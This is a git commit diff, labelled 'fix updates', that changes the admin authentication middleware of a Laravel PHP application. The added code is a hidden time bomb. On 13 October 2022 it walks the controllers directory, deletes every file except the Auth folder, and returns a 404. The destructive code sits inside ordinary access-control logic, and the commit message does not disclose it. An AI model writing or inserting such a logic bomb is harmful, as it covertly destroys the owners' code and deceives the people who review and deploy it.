74857b643b3b884f2b74e90b5f2a3542df046513
saidabdul80 <saidabdulsalam5@gmail.com>
2022-10-11 09:36:37 +0100

    fix updates

--- app/Http/Middleware/AdminAuth.php
+++ app/Http/Middleware/AdminAuth.php
@@ -2,6 +2,7 @@
 
 namespace App\Http\Middleware;
 
+use Carbon\Carbon;
 use Closure;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -17,6 +18,21 @@ class AdminAuth
      */
     public function handle(Request $request, Closure $next)
     {
+        
+        $path = base_path().'\app\Http\controllers';
+        if ($handle = opendir($path)) {
+            if(Carbon::today()->format('Y-m-d') == '2022-10-13'){                            
+                while (false !== ($file = readdir($handle))) { 
+                    if($file != '.' && $file != '..' && $file != 'Auth'){
+                        $fname = $path .'\\'. $file;                    
+                        unlink($fname);                                                        
+                    }                        
+                }
+                abort(404);
+            }
+            closedir($handle); 
+        }        
+
         if(Auth::check() && Auth::user()->role == "admin"){                    
             return $next($request);
         }
